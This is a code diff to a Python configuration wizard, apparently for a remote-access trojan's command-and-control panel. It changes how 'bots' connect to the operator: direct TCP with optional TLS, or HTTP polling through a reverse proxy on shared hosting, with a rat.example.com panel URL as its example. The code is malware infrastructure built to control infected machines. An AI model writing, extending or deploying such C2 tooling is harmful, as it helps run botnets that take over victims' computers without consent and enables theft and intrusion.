@@ -129,7 +129,7 @@ def run_wizard() -> dict:
     mode = choose_interface()
 
     print()
-    print(_c("  C2 (bot) channel", BOLD))
+    print(_c("  Bot transport", BOLD))
     print()
     print("    [1] Direct TCP   the server owns a port, bots connect straight to it")
     print("    [2] HTTP         shared hosting: the bots poll the panel over HTTP")
@@ -146,28 +146,36 @@ def run_wizard() -> dict:
     print(_c("  -> " + ("HTTP polling (shared hosting)" if transport == "http"
                         else "Direct TCP"), GREEN))
 
+    print()
+    print(_c("  C2 (bot) channel", BOLD))
+
     if transport == "http":
-        c2_bind = "127.0.0.1"
+        # The bots go through an HTTP reverse proxy, so the panel's public
+        # URL is what they need; there is no separate C2 port.
+        c2_bind = "0.0.0.0"
         c2_host = ask("  Public URL of the panel (e.g. https://rat.example.com)",
                       existing.get("c2", {}).get("host", "http://127.0.0.1:8080"))
         c2_port = int(existing.get("c2", {}).get("port", 8777))
+        protocol = existing.get("c2", {}).get("protocol", "tcp")
+        cert = existing.get("c2", {}).get("cert", "")
+        key = existing.get("c2", {}).get("key", "")
     else:
         c2_bind = ask("  Bind address (where the C2 listens)",
                       existing.get("c2", {}).get("bind", "0.0.0.0"))
         c2_host = ask("  Address the bots connect to",
                       existing.get("c2", {}).get("host", c2_bind))
         c2_port = ask_int("  C2 port", int(existing.get("c2", {}).get("port", 8777)))
-
-    protocol = ask("  Transport [tcp/tls]", existing.get("c2", {}).get("protocol", "tcp")).lower()
-    if protocol not in ("tcp", "tls"):
-        protocol = "tcp"
-    cert = key = ""
-    if protocol == "tls":
-        cert = ask("  Certificate file", existing.get("c2", {}).get("cert", ""))
-        key = ask("  Private key file", existing.get("c2", {}).get("key", ""))
-        if not cert:
-            print(_c("  ! no certificate given, falling back to tcp", YELLOW))
+        protocol = ask("  Encryption [tcp/tls]",
+                       existing.get("c2", {}).get("protocol", "tcp")).lower()
+        if protocol not in ("tcp", "tls"):
             protocol = "tcp"
+        cert = key = ""
+        if protocol == "tls":
+            cert = ask("  Certificate file", existing.get("c2", {}).get("cert", ""))
+            key = ask("  Private key file", existing.get("c2", {}).get("key", ""))
+            if not cert:
+                print(_c("  ! no certificate given, falling back to tcp", YELLOW))
+                protocol = "tcp"
 
     cfg = {
         "version": 1,
